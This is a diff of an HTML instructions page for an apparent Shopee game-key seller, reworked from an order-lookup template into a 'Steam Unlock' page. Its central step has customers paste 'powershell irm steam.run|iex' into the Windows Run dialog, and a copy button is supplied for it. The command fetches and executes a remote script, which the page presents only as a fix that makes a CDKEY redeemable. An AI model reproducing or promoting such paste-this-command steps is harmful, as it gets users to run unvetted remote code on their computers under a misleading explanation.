@@ -1,231 +1,163 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Shopee Order Lookup</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Steam Unlock • Instructions</title>
   <style>
     :root{
-      --bg:#0b0f1a;
-      --card:#111827;
-      --text:#e5e7eb;
-      --muted:#9ca3af;
-      --accent:#8b5cf6;
-      --border:#1f2937;
+      --bg:#0b0f1a; --card:#111827; --text:#e5e7eb; --muted:#9ca3af;
+      --accent:#8b5cf6; --border:#1f2937;
     }
+    *{box-sizing:border-box}
     body{
-      margin:0;
+      margin:0; font-family:'Segoe UI',Tahoma,sans-serif;
       background:radial-gradient(1100px 500px at 5% 0%, #181f32 0, transparent 60%), var(--bg);
-      font-family:'Segoe UI', Tahoma, sans-serif;
-      color:var(--text);
-      min-height:100vh;
+      color:var(--text); min-height:100vh;
     }
-    header{
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      padding:16px 18px 10px;
-    }
-    .brand{display:flex; gap:10px; align-items:center;}
-    .brand h1{margin:0; font-size:1.08rem;}
-    .brand small{color:var(--muted);}
-    .btn{
-      background:var(--accent);
-      color:#fff;
-      padding:6px 12px;
-      border-radius:999px;
-      text-decoration:none;
-      font-weight:600;
-    }
-    main{
-      max-width:880px;
-      margin:0 auto;
-      padding:16px 16px 28px;
-    }
-    .lookup-card{
-      background:rgba(17,24,39,.85);
-      border:1px solid rgba(31,41,55,.9);
-      border-radius:16px;
-      padding:16px;
-      margin-bottom:18px;
-      box-shadow:0 12px 32px rgba(0,0,0,.25);
-    }
-    label{display:block; margin-bottom:6px; font-weight:600;}
-    input[type="text"]{
-      width:100%;
-      background:#0f172a;
-      border:1px solid #1f2937;
-      border-radius:8px;
-      padding:8px 10px;
-      color:#e5e7eb;
-    }
-    button{
-      margin-top:10px;
-      background:#6366f1;
-      border:none;
-      border-radius:8px;
-      padding:8px 14px;
-      color:#fff;
-      font-weight:600;
-      cursor:pointer;
+    header{display:flex;justify-content:space-between;align-items:center;padding:16px 18px 10px;}
+    .brand{display:flex;gap:10px;align-items:center}
+    .brand h1{margin:0;font-size:1.15rem}
+    .brand small{color:var(--muted)}
+    .btn{background:var(--accent);color:#fff;padding:6px 12px;border-radius:999px;text-decoration:none;font-weight:600}
+    main{max-width:900px;margin:0 auto;padding:16px 16px 28px}
+    .card{
+      background:rgba(17,24,39,.85); border:1px solid rgba(31,41,55,.9);
+      border-radius:16px; padding:16px; margin-bottom:18px; box-shadow:0 12px 32px rgba(0,0,0,.25);
     }
     .result-box{
-      margin-top:14px;
-      background:rgba(15,23,42,.55);
-      border:1px solid rgba(148,163,184,.15);
-      border-radius:10px;
-      padding:10px 12px;
+      margin-top:10px;background:rgba(15,23,42,.55);border:1px solid rgba(148,163,184,.15);
+      border-radius:10px;padding:10px 12px
     }
-    .notfound{
-      margin-top:12px;
-      background:rgba(248,113,113,.12);
-      border:1px solid rgba(248,113,113,.4);
-      border-radius:8px;
-      padding:8px 10px;
-      color:#fecaca;
-    }
-    /* instructions block (reused) */
-    .instructions-card{
-      background:rgba(17,24,39,.85);
-      border:1px solid rgba(31,41,55,.9);
-      border-radius:16px;
-      padding:16px;
-      margin-top:16px;
-    }
-    .instructions-card h2{margin-top:0;}
-    ol.step-list{
-      margin-top:12px;
-      padding-left:20px;
-      line-height:1.6;
-    }
-    ol.step-list li{margin-bottom:10px;}
+    .copy{display:inline-block;margin-left:8px;padding:4px 8px;border-radius:6px;background:#374151;color:#fff;border:none;cursor:pointer}
+    ol.step-list{margin-top:12px;padding-left:20px;line-height:1.6}
+    ol.step-list li{margin-bottom:10px}
     code{
-      background:#0b1220;
-      border:1px solid rgba(148,163,184,.28);
-      padding:3px 6px 4px;
-      border-radius:6px;
-      font-size:.9rem;
-      color:#e2e8f0;
+      background:#0b1220; border:1px solid rgba(148,163,184,.28);
+      padding:3px 6px 4px; border-radius:6px; font-size:.9rem; color:#e2e8f0
     }
-    .explain-box{
-      margin-top:16px;
-      background:rgba(139,92,246,.08);
-      border:1px solid rgba(139,92,246,.25);
-      border-radius:10px;
-      padding:10px 12px;
+    .explain{margin-top:12px;background:rgba(139,92,246,.08);border:1px solid rgba(139,92,246,.25);border-radius:10px;padding:10px 12px}
+    .ref{
+      margin-top:14px;background:rgba(15,23,42,.6);border:1px dashed rgba(148,163,184,.4);
+      border-radius:12px;padding:10px;text-align:center
     }
-    .ref-image-box{
-      margin-top:16px;
-      background:rgba(15,23,42,.6);
-      border:1px dashed rgba(148,163,184,.4);
-      border-radius:12px;
-      padding:10px;
-      text-align:center;
-    }
-    .ref-image-box img{
-      max-width:100%;
-      border-radius:10px;
-    }
-    .ref-caption{
-      margin-top:5px;
-      font-size:.8rem;
-      color:var(--muted);
-    }
-    footer{
-      text-align:center;
-      color:var(--muted);
-      font-size:.8rem;
-      padding:12px 0 16px;
-    }
+    .ref img{max-width:100%;border-radius:10px}
+    .ref .cap{margin-top:6px;color:var(--muted);font-size:.85rem}
+    footer{text-align:center;color:var(--muted);font-size:.85rem;padding:14px 0 18px}
   </style>
 </head>
 <body>
   <header>
     <div class="brand">
-      <img src="/static/steamunlock_wannabe.png" alt="" style="width:42px;height:42px;object-fit:contain;" onerror="this.style.display='none'">
+      <img src="steamunlock_wannabe.png" alt="" style="width:42px;height:42px;object-fit:contain" onerror="this.style.display='none'">
       <div>
-        <h1>Shopee Order Lookup</h1>
-        <small>Enter the Order ID that admin sent to you</small>
+        <h1>Steam Unlock — Instructions</h1>
+        <small>For Shopee customers</small>
       </div>
     </div>
     <a class="btn" href="https://barryhamsy.github.io/gamelist/" target="_blank" rel="noopener">🔗 Main Site</a>
   </header>
 
   <main>
-    <div class="lookup-card">
-      <form method="post">
-        <label for="order_id">Your Shopee Order ID</label>
-        <input type="text" name="order_id" id="order_id" placeholder="e.g. 2410-ABC-12345" required>
-        <button type="submit">Check my CDKEY</button>
-      </form>
-
-      {% if order_data == 'not-found' %}
-        <div class="notfound">
-          ❌ Order not found. Please check the Order ID or contact the admin.
-        </div>
-      {% elif order_data %}
-        <div class="result-box">
-          <p><strong>Order ID:</strong> {{ order_data.order_id }}</p>
-          <p><strong>Steam CDKEY:</strong> {{ order_data.steam_cdkey }}</p>
-          <p><strong>Game AppID:</strong> {{ order_data.appid }}</p>
-          <p><strong>Game Name:</strong> {{ game_name or 'Unknown' }}</p>
-          {% if order_data.note %}
-            <p><strong>Note:</strong> {{ order_data.note }}</p>
-          {% endif %}
-        </div>
-      {% endif %}
+    <!-- OPTIONAL CDKEY/AppID/Game block (shows only if URL params are present) -->
+    <div id="orderCard" class="card" style="display:none">
+      <h2 style="margin:0 0 6px">Your Details</h2>
+      <div class="result-box">
+        <p><strong>Steam CDKEY:</strong> <span id="cdkeyText"></span>
+           <button class="copy" id="copyKeyBtn" title="Copy CDKEY">Copy</button></p>
+        <p><strong>Game AppID:</strong> <span id="appidText"></span></p>
+        <p><strong>Game Name:</strong> <span id="nameText"></span></p>
+      </div>
     </div>
 
-    <!-- instructions, same as your standalone page -->
-    <div class="instructions-card">
-      <h2>How to run the command & redeem your CDKEY</h2>
-      <p class="subtitle">Follow these steps exactly. If Windows blocks it, run again as Admin.</p>
+    <!-- Part 1: Run command -->
+    <div class="card">
+      <h2 style="margin:0 0 6px">Run this command first</h2>
       <ol class="step-list">
         <li><strong>Press the Windows Start menu.</strong></li>
         <li><strong>Type</strong> <em>Run</em> and open the <strong>Run</strong> dialog.</li>
-        <li>
-          In the Run box, type this:
-          <br>
-          <code>powershell  irm steam.run|iex</code>
+        <li>In the Run box, type:
+          <div style="margin-top:6px">
+            <code id="cmd">powershell&nbsp;&nbsp;irm&nbsp;steam.run|iex</code>
+            <button class="copy" id="copyCmdBtn" title="Copy command">Copy</button>
+          </div>
         </li>
-        <li><strong>Redeem the CDKEY</strong> shown above (the one your Shopee admin gave you).</li>
       </ol>
-
-      <div class="explain-box">
-        <h3 style="margin:0 0 5px;">What does this command do?</h3>
-        <p style="margin:0;">
+      <div class="explain">
+        <h3 style="margin:0 0 4px;font-size:1rem">What does this command do?</h3>
+        <p style="margin:0">
           This PowerShell command makes sure your Steam CDKEY can be redeemed and avoids common errors.
-          If you change/format your PC later, just run this command once again and all your games will appear again.
+          If you change/format your PC later, just run this command once again — your games will appear again.
         </p>
       </div>
-
-      <div class="ref-image-box">
-        <img src="/static/steam_run_reference.png" alt="Run dialog example" onerror="this.src='/static/placeholder.jpg'">
-        <div class="ref-caption">Example: Run dialog with <code>powershell  irm steam.run|iex</code></div>
+      <div class="ref">
+        <img src="steam_run_reference.png" alt="Windows Run dialog example" onerror="this.src='placeholder.jpg'">
+        <div class="cap">Example: Run dialog with <code>powershell&nbsp;irm&nbsp;steam.run|iex</code></div>
       </div>
     </div>
-    <!-- NEW: How to redeem the CDKEY (Steam UI) -->
-<div class="instructions-card" style="background:rgba(17,24,39,.85);border:1px solid rgba(31,41,55,.9);border-radius:16px;padding:16px;margin-top:16px;">
-  <h2 style="margin:0;">How to redeem the CDKEY</h2>
-  <ol class="step-list" style="margin-top:12px;padding-left:20px;line-height:1.6;">
-    <li><strong>Open Steam</strong>, click <strong>Games</strong> at the top-left.</li>
-    <li>Select <strong>Activate a product on Steam…</strong></li>
-    <li>Paste your <strong>CDKEY</strong> shown above, then confirm the prompts.</li>
-    <li><strong>Restart Steam</strong> after activation.</li>
-  </ol>
 
-  <div class="ref-image-box" style="margin-top:16px;background:rgba(15,23,42,.6);border:1px dashed rgba(148,163,184,.4);border-radius:12px;padding:10px;text-align:center;">
-    <img src="/static/steam_activate_product.png" alt="Steam → Games → Activate a Product" style="max-width:100%;border-radius:10px;" onerror="this.src='/static/placeholder.jpg'">
-    <div class="ref-caption" style="margin-top:6px;color:#9ca3af;font-size:.85rem;">
-      Example: Steam &rarr; <code>Games</code> &rarr; <code>Activate a product on Steam</code>
+    <!-- Part 2: Redeem on Steam -->
+    <div class="card">
+      <h2 style="margin:0">How to redeem the CDKEY</h2>
+      <ol class="step-list">
+        <li>Open <strong>Steam</strong>, click <strong>Games</strong> at the top-left.</li>
+        <li>Select <strong>Activate a product on Steam…</strong></li>
+        <li>Paste your <strong>CDKEY</strong> and confirm the prompts.</li>
+        <li><strong>Restart Steam</strong> after activation.</li>
+      </ol>
+      <div class="ref">
+        <img src="steam_activate_product.png" alt="Steam → Games → Activate a Product" onerror="this.src='placeholder.jpg'">
+        <div class="cap">Example: Steam → <code>Games</code> → <code>Activate a product on Steam</code></div>
+      </div>
     </div>
-  </div>
-</div>
-
   </main>
 
-  <footer>
-    © 2025 Barry’s Game Store. Need help? Contact admin.
-  </footer>
+  <footer>© 2025 Barry’s Game Store</footer>
+
+  <script>
+    // Read optional params: ?cdkey=XXXX&appid=123&name=Game%20Name
+    (function(){
+      const params = new URLSearchParams(location.search);
+      const cdkey = (params.get('cdkey') || '').trim();
+      const appid = (params.get('appid') || '').trim();
+      const name  = (params.get('name')  || '').trim();
+
+      const card  = document.getElementById('orderCard');
+      const kEl   = document.getElementById('cdkeyText');
+      const aEl   = document.getElementById('appidText');
+      const nEl   = document.getElementById('nameText');
+
+      if (cdkey || appid || name){
+        if (cdkey) kEl.textContent = cdkey; else kEl.textContent = '(not provided)';
+        if (appid) aEl.textContent = appid; else aEl.textContent = '(not provided)';
+        if (name)  nEl.textContent = name;  else nEl.textContent = '(not provided)';
+        card.style.display = 'block';
+      }
+
+      // Copy helpers
+      function copy(text){
+        try{
+          navigator.clipboard.writeText(text);
+          alert('Copied!');
+        }catch(e){
+          // fallback for old browsers
+          const ta = document.createElement('textarea');
+          ta.value = text; document.body.appendChild(ta); ta.select();
+          try{ document.execCommand('copy'); alert('Copied!'); }catch(_){}
+          document.body.removeChild(ta);
+        }
+      }
+
+      document.getElementById('copyCmdBtn').addEventListener('click', function(){
+        copy('powershell  irm steam.run|iex');
+      });
+
+      document.getElementById('copyKeyBtn').addEventListener('click', function(){
+        const v = kEl.textContent || '';
+        if (!v || v === '(not provided)'){ alert('No CDKEY to copy'); return; }
+        copy(v);
+      });
+    })();
+  </script>
 </body>
 </html>
